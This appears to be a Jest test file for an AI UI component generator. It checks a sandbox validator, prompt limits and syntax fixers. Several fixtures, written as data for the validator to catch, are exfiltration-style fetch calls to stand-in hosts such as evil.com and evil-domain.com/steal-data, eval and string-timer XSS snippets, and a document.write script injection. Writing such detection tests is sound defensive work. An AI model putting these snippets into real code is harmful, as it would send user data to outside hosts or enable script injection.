/**
 * Test suite for enhanced security and performance improvements
 *
 * Author: M.H. Nishan Sathsara
 * Project: AI-Powered UI Component Generator
 */

import {
  validateSandboxCode,
  processComponentCode,
  SECURITY_CONFIG,
} from "../utils/codeProcessor.js";
import {
  validatePromptComplexity,
  VALIDATION_CONFIG,
  fuzzyMatchRestrictedKeywords,
} from "../utils/promptValidation.js";
import {
  fixCommonSyntaxIssues,
  fixErrorObjectRendering,
  fixApiCalls,
} from "../utils/syntaxFixes.js";

describe("Enhanced Security Validation", () => {
  test("should detect string-based eval patterns", () => {
    const code = `
      setTimeout("alert('xss')", 1000);
      setInterval('console.log("bad")', 500);
    `;
    const result = validateSandboxCode(code);
    expect(result.isValid).toBe(false);
    expect(
      result.errors.some(
        (error) =>
          error.includes("String-based setTimeout") ||
          error.includes("String-based setInterval")
      )
    ).toBe(true);
  });

  test("should detect dangerous DOM manipulation", () => {
    const code = `
      element.innerHTML = userInput;
      document.write('<script>alert("xss")</script>');
      element.outerHTML = maliciousCode;
    `;
    const result = validateSandboxCode(code);
    expect(
      result.warnings.some(
        (warning) =>
          warning.includes("innerHTML") ||
          warning.includes("outerHTML") ||
          warning.includes("document.write")
      )
    ).toBe(true);
  });

  test("should allow safe CDN domains", () => {
    const code = `
      fetch('https://unpkg.com/react@18.2.0/package.json');
      fetch('https://cdn.tailwindcss.com/config.js');
    `;
    const result = validateSandboxCode(code);
    expect(result.isValid).toBe(true);
  });

  test("should block non-whitelisted external requests", () => {
    const code = `
      fetch('https://evil-domain.com/steal-data');
      XMLHttpRequest.open('GET', 'https://malicious.com');
    `;
    const result = validateSandboxCode(code);
    expect(
      result.warnings.some(
        (warning) =>
          warning.includes("External fetch") ||
          warning.includes("XMLHttpRequest")
      )
    ).toBe(true);
  });
});

describe("Enhanced Code Processing", () => {
  test("should fix error object rendering patterns", () => {
    const code = `
      const [error, setError] = useState(null);
      return <div>{error && <p>{error}</p>}</div>;
    `;
    const result = fixErrorObjectRendering(code);
    expect(result).toContain("error.message || String(error)");
  });

  test("should replace external API calls with mocks", () => {
    const code = `
      fetch('https://api.example.com/data')
        .then(res => res.json())
        .then(data => setData(data));
    `;
    const result = fixApiCalls(code);
    expect(result).toContain("Promise.resolve");
    expect(result).toContain("json: () => Promise.resolve([])");
  });

  test("should preserve safe imports while removing unsafe ones", () => {
    const code = `
      import React from 'react';
      import { useState } from 'react';
      import axios from 'axios';
      import moment from 'moment';
    `;
    const result = processComponentCode(code);
    expect(result).not.toContain("import React");
    expect(result).not.toContain("import { useState }");
    expect(result).not.toContain("import axios");
    expect(result).not.toContain("import moment");
  });

  test("should add proper sandbox export", () => {
    const code = `
      const MyComponent = () => {
        return <div>Hello</div>;
      };
    `;
    const result = processComponentCode(code);
    expect(result).toContain("window.GeneratedComponent = MyComponent");
  });
});

describe("Enhanced Prompt Validation", () => {
  test("should use token-based length validation", () => {
    const longPrompt = "create a very ".repeat(50) + "complex component";
    const result = validatePromptComplexity(longPrompt);
    expect(result.success).toBe(false);
    expect(result.error).toContain("tokens");
  });

  test("should detect fuzzy matches for restricted keywords", () => {
    const result = validatePromptComplexity("create a drag-and-drop interface");
    expect(result.success).toBe(false);
    expect(
      result.restrictedKeywords.some(
        (kw) => kw.includes("drag") || kw.includes("drop")
      )
    ).toBe(true);
  });

  test("should calculate complexity scores correctly", () => {
    const simplePrompt = "create a blue button";
    const complexPrompt =
      "create a drag and drop file uploader with real-time API sync and animation";

    const simpleResult = validatePromptComplexity(simplePrompt);
    const complexResult = validatePromptComplexity(complexPrompt);

    expect(simpleResult.success).toBe(true);
    expect(complexResult.success).toBe(false);
  });

  test("should detect multiple components using NLP heuristics", () => {
    const multiplePrompt =
      "create a header with navigation and a footer with links and a sidebar with menu";
    const result = validatePromptComplexity(multiplePrompt);
    expect(result.success).toBe(false);
    expect(result.error).toContain("one simple component at a time");
  });

  test("should provide helpful suggestions for rejected prompts", () => {
    const result = validatePromptComplexity("create a 3D animation with WebGL");
    expect(result.success).toBe(false);
    expect(result.suggestions).toBeDefined();
    expect(result.suggestions.length).toBeGreaterThan(0);
  });
});

describe("Syntax Fixes", () => {
  test("should fix missing semicolons", () => {
    const code = `
      const data = getData()
      setData(newData)
    `;
    const result = fixCommonSyntaxIssues(code);
    expect(result).toContain("getData();");
    expect(result).toContain("setData(newData);");
  });

  test("should clean up malformed patterns", () => {
    const code = `
      const value = "";;
      someFunction(),,;
    `;
    const result = fixCommonSyntaxIssues(code);
    expect(result).not.toContain(";;");
    expect(result).not.toContain(",,;");
  });

  test("should preserve valid code patterns", () => {
    const validCode = `
      const Component = () => {
        const [state, setState] = useState('');
        return <div>{state}</div>;
      };
    `;
    const result = fixCommonSyntaxIssues(validCode);
    expect(result).toContain("useState");
    expect(result).toContain("setState");
    expect(result).toContain("<div>{state}</div>");
  });
});

// Performance tests
describe("Performance Optimizations", () => {
  test("should process code efficiently", async () => {
    const largeCode =
      "const component = () => {\n".repeat(100) +
      "  return <div>test</div>;\n".repeat(100) +
      "};\n".repeat(100);

    const startTime = performance.now();
    const result = processComponentCode(largeCode);
    const endTime = performance.now();

    expect(endTime - startTime).toBeLessThan(1000); // Should complete in under 1 second
    expect(result).toBeDefined();
  });

  test("should validate prompts efficiently", () => {
    const complexPrompt =
      "create a complex component with ".repeat(20) + "many features";

    const startTime = performance.now();
    const result = validatePromptComplexity(complexPrompt);
    const endTime = performance.now();

    expect(endTime - startTime).toBeLessThan(100); // Should complete in under 100ms
    expect(result).toBeDefined();
  });
});

// Integration tests
describe("Integration Tests", () => {
  test("should handle complete workflow from prompt to processed code", () => {
    const prompt = "create a simple blue button with hover effects";
    const mockCode = `
      const Button = () => {
        return (
          <button className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded">
            Click me
          </button>
        );
      };
      export default Button;
    `;

    // Step 1: Validate prompt
    const promptValidation = validatePromptComplexity(prompt);
    expect(promptValidation.success).toBe(true);

    // Step 2: Process code
    const processedCode = processComponentCode(mockCode);
    expect(processedCode).toBeDefined();
    expect(processedCode).toContain("window.GeneratedComponent");

    // Step 3: Validate processed code
    const codeValidation = validateSandboxCode(processedCode);
    expect(codeValidation.isValid).toBe(true);
  });

  test("should reject and sanitize dangerous workflow", () => {
    const dangerousPrompt =
      "create a file upload component with drag and drop and 3D preview";
    const dangerousCode = `
      eval('malicious code');
      fetch('https://evil.com/steal');
      setTimeout("alert('xss')", 1000);
    `;

    // Step 1: Validate prompt - should fail
    const promptValidation = validatePromptComplexity(dangerousPrompt);
    expect(promptValidation.success).toBe(false);

    // Step 2: Validate code - should detect security issues
    const codeValidation = validateSandboxCode(dangerousCode);
    expect(codeValidation.isValid).toBe(false);
    expect(codeValidation.errors.length).toBeGreaterThan(0);
  });
});

export {
  validateSandboxCode,
  processComponentCode,
  validatePromptComplexity,
  fixCommonSyntaxIssues,
  fixErrorObjectRendering,
  fixApiCalls,
};
